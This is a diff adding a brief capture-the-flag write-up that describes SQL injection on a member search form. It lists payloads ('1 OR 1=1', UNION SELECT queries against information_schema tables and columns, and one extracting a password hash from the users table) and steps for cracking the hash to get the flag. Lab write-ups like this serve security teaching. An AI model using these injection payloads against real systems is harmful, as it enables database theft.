@@ -1,0 +1,11 @@
+on the member page you can perfom a sql injection with the following lines in the SEARCH MEMBER BY ID form,
+
+get all users with : 1 OR 1=1 we find this user call get the flag with the id 5
+get all tables with : 1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables
+get all colums with : 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
+
+where user_id = 5
+
+5 UNION SELECT countersign, Commentaire FROM users WHERE user_id = 5
+
+countersign == 5ff9d0165b4f92b14994e5c685cdce28 && Commentaire == Decrypt this password -> then lower all the char. Sh256 on it and it's good !
